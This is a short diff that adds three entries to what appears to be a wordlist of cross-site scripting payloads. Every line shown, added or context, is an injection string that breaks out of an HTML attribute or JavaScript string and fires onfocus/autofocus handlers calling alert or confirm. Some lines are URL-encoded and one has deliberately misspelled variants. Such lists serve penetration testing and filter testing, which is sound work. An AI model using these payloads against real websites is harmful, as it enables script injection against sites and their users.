@@ -1,4 +1,7 @@
  “-confirm`1`-”
+  '" autofocus/onfocus=confirm`xss`//
+"/autofocus/onfocus=alert`123`//
+" /autofucus/onfoucs=alert`123`//
  \'-alert(1)//
  %27%22%20autofocus/onfocus=confirm`xss`//
 \”-confirm`1`//
